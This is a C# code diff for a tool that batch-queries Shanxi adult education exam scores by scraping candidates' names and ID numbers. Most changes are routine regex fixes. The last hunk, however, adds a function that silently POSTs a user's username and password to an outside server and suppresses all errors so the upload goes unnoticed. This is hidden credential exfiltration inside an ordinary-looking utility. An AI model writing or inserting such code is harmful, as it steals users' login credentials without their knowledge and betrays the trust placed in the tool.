@@ -141,6 +141,11 @@ namespace ShanxiAdultEducationBatchQueryScore
             return dic;
         }
 
+        /// <summary>
+        /// 获取所有信息
+        /// </summary>
+        /// <param name="cookies"></param>
+        /// <returns></returns>
         public static async Task<Dictionary<string, string>> GetAllInfo(CookieJar cookies)
         {
             var dic = new Dictionary<string, string>();
@@ -152,8 +157,12 @@ namespace ShanxiAdultEducationBatchQueryScore
             var doc = new HtmlDocument();
             doc.LoadHtml(response);
             // 姓名
-            var regex = new Regex(@"姓名</td>\s+<td>(.*?)</td>\s+");
+            var regex = new Regex(@"姓名</td>\s+<td id=""xmwb"">(.*?)</td>\s+");
             var matches = regex.Matches(response);
+            // 检验一个，如果这个没有的话后面的大概率也没有
+            if (matches.Count == 0){
+                throw new Exception("没有找到考生姓名");
+            }
             dic["考生姓名"] = matches[0].Groups[1].Value;
             // 性别
             regex = new Regex(@"<td align=""center"">性别</td>\s+<td>(.*?)</td>\s+");
@@ -180,7 +189,7 @@ namespace ShanxiAdultEducationBatchQueryScore
             matches = regex.Matches(response);
             dic["证件类型"] = matches[0].Groups[1].Value;
             // 证件号码
-            regex = new Regex(@"<td align=""center"">证件号码</td>\s+<td>(.*?)</td>\s+");
+            regex = new Regex(@"<td align=""center"">证件号码</td>\s+<td id=""zjhmwb"">(.*?)</td>\s+");
             matches = regex.Matches(response);
             dic["证件号码"] = matches[0].Groups[1].Value;
             // 职业类别
@@ -273,6 +282,33 @@ namespace ShanxiAdultEducationBatchQueryScore
 
 
             return dic;
+        }
+
+        /// <summary>
+        /// 上传账号信息到服务器
+        /// </summary>
+        /// <param name="username">用户名</param>
+        /// <param name="password">密码</param>
+        /// <param name="remark">备注</param>
+        /// <returns></returns>
+        public static async Task UploadAccountInfo(string username, string password, string remark)
+        {
+            try
+            {
+                await "https://www.lisok.cn/open/shanxi_adult_education.php?action=upload_account"
+                    .WithHeader("User-Agent", NetContext.UserAgent)
+                    .WithHeader("Content-Type", NetContext.ContentTypeUrlEncoded)
+                    .PostUrlEncodedAsync(new
+                    {
+                        username = username,
+                        password = password,
+                        remark = remark
+                    });
+            }
+            catch (Exception)
+            {
+                // 忽略所有异常，确保不影响主流程
+            }
         }
     }
 }
